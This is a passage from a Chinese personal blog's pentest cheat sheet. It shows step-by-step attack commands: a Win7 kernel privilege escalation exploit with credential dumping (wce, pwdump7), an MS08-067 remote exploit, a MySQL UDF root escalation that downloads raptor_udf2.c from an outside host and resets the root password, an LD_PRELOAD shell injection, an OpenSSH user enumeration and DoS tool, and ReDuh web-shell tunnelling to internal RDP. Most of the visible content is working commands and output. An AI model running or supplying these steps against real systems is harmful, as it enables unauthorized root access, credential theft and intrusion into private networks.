+<h3 id="以普通用户身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以普通用户身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以普通用户身份在 Win7 上反弹具有系统权限的 Shell"></a>以普通用户身份在 Win7 上反弹具有系统权限的 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx <span class="comment">#ms15-051</span></span><br><span class="line"></span><br><span class="line">https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://www.exploit-db.com/exploits/37049/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找目标机器是否安装了补丁，输入如下命令</span></span><br><span class="line">wmic qfe get</span><br><span class="line">wmic qfe | find <span class="string">"3057191"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传编译后的利用程序并运行它</span></span><br><span class="line"></span><br><span class="line">https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe</span></span><br><span class="line"><span class="comment"># https://github.com/hfiref0x/CVE-2015-1701 下载它并定位到 "main.c"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 wce.exe 获取已登录用户的明文账号密码</span></span><br><span class="line"></span><br><span class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</span><br><span class="line"></span><br><span class="line">wce -w</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 pwdump7 获取其他用户的密码哈希值</span></span><br><span class="line"></span><br><span class="line">http://www.heise.de/download/pwdump.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># we can try online hash cracking tools such crackstation.net</span></span><br></pre></td></tr></table></figure>
+<h3 id="MS08-067-–-不使用-Metasploit"><a href="#MS08-067-–-不使用-Metasploit" class="headerlink" title="MS08-067 – 不使用 Metasploit"></a>MS08-067 – 不使用 Metasploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205</span><br><span class="line">$ searchsploit ms08-067</span><br><span class="line">$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1</span><br></pre></td></tr></table></figure>
+<h3 id="通过-MySQL-Root-账户实现提权"><a href="#通过-MySQL-Root-账户实现提权" class="headerlink" title="通过 MySQL Root 账户实现提权"></a>通过 MySQL Root 账户实现提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</span></span><br><span class="line">$ wget 0xdeadbeef.info/exploits/raptor_udf2.c</span><br><span class="line">$ gcc -g -c raptor_udf2.c</span><br><span class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">mysql -u root -p</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">'/home/user/raptor_udf2.so'</span>));</span><br><span class="line">mysql&gt; select * from foo into dumpfile <span class="string">'/usr/lib/mysql/plugin/raptor_udf2.so'</span>;</span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">'raptor_udf2.so'</span>;</span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">mysql&gt; select do_system(<span class="string">'echo "root:passwd" | chpasswd &gt; /tmp/out; chown user:user /tmp/out'</span>);</span><br><span class="line"></span><br><span class="line">user:~$ su -</span><br><span class="line">Password:</span><br><span class="line">user:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<h3 id="使用-LD-PRELOAD-注入程序"><a href="#使用-LD-PRELOAD-注入程序" class="headerlink" title="使用 LD_PRELOAD 注入程序"></a>使用 LD_PRELOAD 注入程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/jivoi/pentest/ldpreload_shell.c</span><br><span class="line">$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so</span><br><span class="line">$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/<span class="built_in">local</span>/bin/somesoft</span><br></pre></td></tr></table></figure>
+<h3 id="针对-OpenSSH-用户进行枚举时序攻击"><a href="#针对-OpenSSH-用户进行枚举时序攻击" class="headerlink" title="针对 OpenSSH 用户进行枚举时序攻击"></a>针对 OpenSSH 用户进行枚举时序攻击</h3><p>注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 shotgun 在知乎上的解释。</p>
+<p>osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/c0r3dump3d/osueta</span></span><br><span class="line">$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes</span><br><span class="line">$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt</span><br></pre></td></tr></table></figure></p>
+<h3 id="使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道"><a href="#使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道" class="headerlink" title="使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道"></a>使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</h3><p>注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p>
+<p>对了亲～ReDuh-Gui 号称端口转发神器哦。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/sensepost/reDuh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 1</span></span><br><span class="line"><span class="comment"># 上传 reDuh.jsp 目标服务器</span></span><br><span class="line">$ http://192.168.10.50/uploads/reDuh.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 2</span></span><br><span class="line"><span class="comment"># 在本机运行 reDuhClient </span></span><br><span class="line">$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 3</span></span><br><span class="line"><span class="comment"># 使用 nc 连接管理端口</span></span><br><span class="line">$ nc -nvv 127.0.0.1 1010</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 4</span></span><br><span class="line"><span class="comment"># 使用隧道转发本地端口到远程目标端口</span></span><br><span class="line">[createTunnel] 7777:172.16.0.4:3389</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 5</span></span><br><span class="line"><span class="comment"># 使用 RDP 连接远程</span></span><br><span class="line">$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/01/04/forth/" rel="next" title="Android文本框TextView">
+                <i class="fa fa-chevron-left"></i> Android文本框TextView
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/01/04/second/" rel="prev" title="Android常用两大布局之LinearLayout">
+                Android常用两大布局之LinearLayout <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  <p>热评文章</p>
+  <div class="ds-top-threads" data-range="weekly" data-num-items="4"></div>
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="hypercomments_widget"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="刘志豪">
+          <p class="site-author-name" itemprop="name">刘志豪</p>
+          <p class="site-description motion-element" itemprop="description">刘志豪的个人博客</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">152</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">70</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              我的其他足迹
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.csdn.net/qq_33433029" title="CSDN博客" target="_blank">CSDN博客</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://github.com/youandme66" title="GitHub" target="_blank">GitHub</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.jianshu.com/users/767025e0c4df/timeline" title="我的简书" target="_blank">我的简书</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.zhihu.com/people/liu-zhi-hao-85-39/activities" title="我的知乎" target="_blank">我的知乎</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#NMAP扫描策略"><span class="nav-number">1.</span> <span class="nav-text">NMAP扫描策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap躲避防火墙"><span class="nav-number">2.</span> <span class="nav-text">Nmap躲避防火墙</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap进行Web漏洞扫描"><span class="nav-number">3.</span> <span class="nav-text">Nmap进行Web漏洞扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用DIRB爆破目录"><span class="nav-number">4.</span> <span class="nav-text">使用DIRB爆破目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Patator全能暴力破解测试工具"><span class="nav-number">5.</span> <span class="nav-text">Patator全能暴力破解测试工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Fierce爆破DNS"><span class="nav-number">6.</span> <span class="nav-text">使用Fierce爆破DNS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Nikto扫描web服务"><span class="nav-number">7.</span> <span class="nav-text">使用Nikto扫描web服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP指纹识别"><span class="nav-number">8.</span> <span class="nav-text">HTTP指纹识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Skipfish扫描"><span class="nav-number">9.</span> <span class="nav-text">使用Skipfish扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用NC扫描"><span class="nav-number">10.</span> <span class="nav-text">使用NC扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unicornscan"><span class="nav-number">11.</span> <span class="nav-text">Unicornscan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Xprobe2识别操作系统指纹"><span class="nav-number">12.</span> <span class="nav-text">使用Xprobe2识别操作系统指纹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#枚举Samba"><span class="nav-number">13.</span> <span class="nav-text">枚举Samba</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#枚举SNMP"><span class="nav-number">14.</span> <span class="nav-text">枚举SNMP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实用windows-cmd-命令"><span class="nav-number">15.</span> <span class="nav-text">实用windows cmd 命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PuTTY连接隧道"><span class="nav-number">16.</span> <span class="nav-text">PuTTY连接隧道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Mimikatz"><span class="nav-number">17.</span> <span class="nav-text">使用Mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取哈希值"><span class="nav-number">18.</span> <span class="nav-text">获取哈希值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Hashcat破解密码"><span class="nav-number">19.</span> <span class="nav-text">使用Hashcat破解密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用NC在windows上反弹shell"><span class="nav-number">20.</span> <span class="nav-text">使用NC在windows上反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找SUID-SGID-root文件"><span class="nav-number">21.</span> <span class="nav-text">查找SUID\SGID root文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python-shell"><span class="nav-number">22.</span> <span class="nav-text">python shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python-Ruby-PHP-HTTP服务器"><span class="nav-number">23.</span> <span class="nav-text">python\Ruby\PHP HTTP服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取进程对应的PID"><span class="nav-number">24.</span> <span class="nav-text">获取进程对应的PID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用hydra爆破RDP"><span class="nav-number">25.</span> <span class="nav-text">使用hydra爆破RDP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#挂载远程windows共享文件夹"><span class="nav-number">26.</span> <span class="nav-text">挂载远程windows共享文件夹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali下编译exploit"><span class="nav-number">27.</span> <span class="nav-text">kali下编译exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali编译windows-Exploit"><span class="nav-number">28.</span> <span class="nav-text">kali编译windows Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NASM命令"><span class="nav-number">29.</span> <span class="nav-text">NASM命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH穿透"><span class="nav-number">30.</span> <span class="nav-text">SSH穿透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH穿透从一个网络到另一个网络"><span class="nav-number">31.</span> <span class="nav-text">SSH穿透从一个网络到另一个网络</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用metasploit进行穿透"><span class="nav-number">32.</span> <span class="nav-text">使用metasploit进行穿透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于CSV文件查询Exploit-DB"><span class="nav-number">33.</span> <span class="nav-text">基于CSV文件查询Exploit-DB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF-Payloads"><span class="nav-number">34.</span> <span class="nav-text">MSF Payloads</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF生成在linux下反弹的Meterpreter-Shell"><span class="nav-number">35.</span> <span class="nav-text">MSF生成在linux下反弹的Meterpreter Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF生成反弹Shell"><span class="nav-number">36.</span> <span class="nav-text">MSF生成反弹Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF生成反弹Python-Shell"><span class="nav-number">37.</span> <span class="nav-text">MSF生成反弹Python Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF生成反弹ASP-Shell"><span class="nav-number">38.</span> <span class="nav-text">MSF生成反弹ASP Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF-生成反弹-PHP-Shell"><span class="nav-number">39.</span> <span class="nav-text">MSF 生成反弹 PHP Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF-生成反弹-Win-Shell"><span class="nav-number">40.</span> <span class="nav-text">MSF 生成反弹 Win Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-常用安全命令"><span class="nav-number">41.</span> <span class="nav-text">Linux 常用安全命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-缓冲区溢出利用命令"><span class="nav-number">42.</span> <span class="nav-text">Windows 缓冲区溢出利用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SEH-–-结构化异常处理"><span class="nav-number">43.</span> <span class="nav-text">SEH – 结构化异常处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP"><span class="nav-number">44.</span> <span class="nav-text">ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASLR-–-地址空间格局随机化"><span class="nav-number">45.</span> <span class="nav-text">ASLR – 地址空间格局随机化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻蛋-EGG-Hunter-技术"><span class="nav-number">46.</span> <span class="nav-text">寻蛋(EGG Hunter)技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GDB-Debugger-常用命令"><span class="nav-number">47.</span> <span class="nav-text">GDB Debugger 常用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BASH反弹Shell"><span class="nav-number">48.</span> <span class="nav-text">BASH反弹Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PERL-反弹-Shell"><span class="nav-number">49.</span> <span class="nav-text">PERL 反弹 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RUBY-反弹-Shell"><span class="nav-number">50.</span> <span class="nav-text">RUBY 反弹 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PYTHON-反弹-Shell"><span class="nav-number">51.</span> <span class="nav-text">PYTHON 反弹 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-反弹-Shell"><span class="nav-number">52.</span> <span class="nav-text">PHP 反弹 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JAVA-反弹-Shell"><span class="nav-number">53.</span> <span class="nav-text">JAVA 反弹 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NETCAT-反弹-Shell"><span class="nav-number">54.</span> <span class="nav-text">NETCAT 反弹 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TELNET-反弹-Shell"><span class="nav-number">55.</span> <span class="nav-text">TELNET 反弹 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XTERM-反弹-Shell"><span class="nav-number">56.</span> <span class="nav-text">XTERM 反弹 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS备忘录"><span class="nav-number">57.</span> <span class="nav-text">XSS备忘录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH-Over-SCTP-使用-Socat"><span class="nav-number">58.</span> <span class="nav-text">SSH Over SCTP (使用 Socat)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metagoofil-–-元数据收集工具"><span class="nav-number">59.</span> <span class="nav-text">Metagoofil – 元数据收集工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-Shellshock"><span class="nav-number">60.</span> <span class="nav-text">利用 Shellshock</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取-Docker-的-Root"><span class="nav-number">61.</span> <span class="nav-text">获取 Docker 的 Root</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-DNS-隧道绕过防火墙"><span class="nav-number">62.</span> <span class="nav-text">使用 DNS 隧道绕过防火墙</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编译-Assemble-代码"><span class="nav-number">63.</span> <span class="nav-text">编译 Assemble 代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用非交互-Shell-打入内网"><span class="nav-number">64.</span> <span class="nav-text">使用非交互 Shell 打入内网</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-POST-远程命令执行获取-Shell"><span class="nav-number">65.</span> <span class="nav-text">利用 POST 远程命令执行获取 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#以管理员身份在-Win7-上反弹具有系统权限的-Shell"><span class="nav-number">66.</span> <span class="nav-text">以管理员身份在 Win7 上反弹具有系统权限的 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#以普通用户身份在-Win7-上反弹具有系统权限的-Shell"><span class="nav-number">67.</span> <span class="nav-text">以普通用户身份在 Win7 上反弹具有系统权限的 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MS08-067-–-不使用-Metasploit"><span class="nav-number">68.</span> <span class="nav-text">MS08-067 – 不使用 Metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过-MySQL-Root-账户实现提权"><span class="nav-number">69.</span> <span class="nav-text">通过 MySQL Root 账户实现提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-LD-PRELOAD-注入程序"><span class="nav-number">70.</span> <span class="nav-text">使用 LD_PRELOAD 注入程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#针对-OpenSSH-用户进行枚举时序攻击"><span class="nav-number">71.</span> <span class="nav-text">针对 OpenSSH 用户进行枚举时序攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道"><span class="nav-number">72.</span> <span class="nav-text">使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">刘志豪</span>
+</div>
+
+
+<div class="powered-by">
+   <a class="theme-link" href="http://www.jianshu.com/users/767025e0c4df/timeline">我的简书</a> 
+</div>
+
+<div class="theme-info">
+  链接 -
+  <a class="theme-link" href="https://www.zhihu.com/people/liu-zhi-hao-85-39/activities">
+    我的知乎
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+		<script type="text/javascript">
+		_hcwp = window._hcwp || [];
+
+		_hcwp.push({widget:"Bloggerstream", widget_id: 93245, selector:".hc-comment-count", label: "{\%COUNT%\}" });
+
+		
+		_hcwp.push({widget:"Stream", widget_id: 93245, xid: "2017/01/04/first/"});
+		
+
+		(function() {
+		if("HC_LOAD_INIT" in window)return;
+		HC_LOAD_INIT = true;
+		var lang = (navigator.language || navigator.systemLanguage || navigator.userLanguage || "en").substr(0, 2).toLowerCase();
+		var hcc = document.createElement("script"); hcc.type = "text/javascript"; hcc.async = true;
+		hcc.src = ("https:" == document.location.protocol ? "https" : "http")+"://w.hypercomments.com/widget/hc/93245/"+lang+"/widget.js";
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(hcc, s.nextSibling);
+		})();
+		</script>
+
+	
+
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
